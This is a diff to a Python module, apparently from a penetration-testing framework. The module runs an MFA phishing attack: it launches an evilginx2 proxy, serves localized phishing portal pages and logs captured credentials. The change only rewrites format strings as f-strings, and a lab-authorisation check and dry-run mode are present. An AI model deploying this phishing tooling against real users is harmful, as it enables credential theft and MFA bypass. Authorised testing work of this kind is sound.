@@ -122,14 +122,14 @@ class Exploit(Exploit):
             p = Path(self.custom_template_dir)
             if p.is_dir():
                 return p
-            print_error("Custom template not found: {}".format(p))
+            print_error(f"Custom template not found: {p}")
             return None
 
         resources = Path(__file__).resolve().parents[3] / "resources" / "phishing_pages"
         tpl = resources / self.template
         if tpl.is_dir():
             return tpl
-        print_error("Template '{}' not found.".format(self.template))
+        print_error(f"Template '{self.template}' not found.")
         return None
 
     def _run_evilginx_proxy(self) -> None:
@@ -138,7 +138,7 @@ class Exploit(Exploit):
             print_error("evilginx not found on PATH.")
             return
 
-        print_status("Launching evilginx2 proxy on {}...".format(self.evilginx_domain))
+        print_status(f"Launching evilginx2 proxy on {self.evilginx_domain}...")
         try:
             subprocess.run(["sudo", "evilginx"], check=False)
         except KeyboardInterrupt:
@@ -150,7 +150,7 @@ class Exploit(Exploit):
             print_error("cloud_url is required for cloud_redirect mode.")
             return
 
-        print_status("Redirecting all traffic to {}".format(self.cloud_url))
+        print_status(f"Redirecting all traffic to {self.cloud_url}")
 
         class RedirectHandler(http.server.BaseHTTPRequestHandler):
             cloud_target = self.cloud_url
@@ -210,7 +210,7 @@ class Exploit(Exploit):
         require_authorised_lab()
 
         if self.dry_run:
-            print_info("DRY RUN — MFA phishing: {} mode".format(self.mode))
+            print_info(f"DRY RUN — MFA phishing: {self.mode} mode")
             return
 
         if self.mode == "external_proxy":
@@ -232,12 +232,11 @@ class Exploit(Exploit):
         I18nPortalHandler.extra_vars = {}
 
         server = http.server.HTTPServer(("0.0.0.0", self.portal_port), I18nPortalHandler)
-        print_status("MFA portal (i18n) on port {} — template: {}".format(
-            self.portal_port, self.template))
+        print_status(f"MFA portal (i18n) on port {self.portal_port} — template: {self.template}")
         print_info("Auto-detect locales: {}".format(", ".join(SUPPORTED_LOCALES)))
         print_info("Connectivity detection: {}".format(
             "ON" if self.connectivity_detection else "OFF"))
-        print_info("Credentials log: {}".format(I18nPortalHandler.cred_log))
+        print_info(f"Credentials log: {I18nPortalHandler.cred_log}")
 
         try:
             server.serve_forever()
@@ -247,4 +246,4 @@ class Exploit(Exploit):
         cred_log = I18nPortalHandler.cred_log
         if cred_log.exists():
             count = sum(1 for _ in open(cred_log, encoding="utf-8"))
-            print_success("Captured {} MFA credential entries.".format(count))
+            print_success(f"Captured {count} MFA credential entries.")
